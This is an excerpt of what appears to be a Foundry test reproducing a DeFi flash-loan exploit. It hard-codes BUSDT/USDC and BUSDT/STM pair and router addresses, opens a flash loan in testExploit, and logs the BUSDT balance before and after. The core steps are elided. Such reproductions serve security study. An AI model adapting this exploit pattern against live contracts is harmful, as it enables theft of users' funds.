...
contract ContractTest is Test {
    Uni_Pair_V3 constant BUSDT_USDC =
        Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    ...
    Uni_Pair_V2 constant BUSDT_STM =
        Uni_Pair_V2(0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C);
    Uni_Router_V2 constant ROUTER =
        Uni_Router_V2(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);
    ...
    function testExploit() public {
        console.log("---------------------------------------------------");
        console.log("BUSDT balance before:", BUSDT.balanceOf(address(this))/1e18);
        console.log("---------------------------------------------------");
        BUSDT_USDC.flash(
            address(this),
            flashBUSDTAmount,
        ...
        console.log("---------------------------------------------------");
        console.log("BUSDT balance after:", BUSDT.balanceOf(address(this))/1e18);
        console.log("---------------------------------------------------");
    }
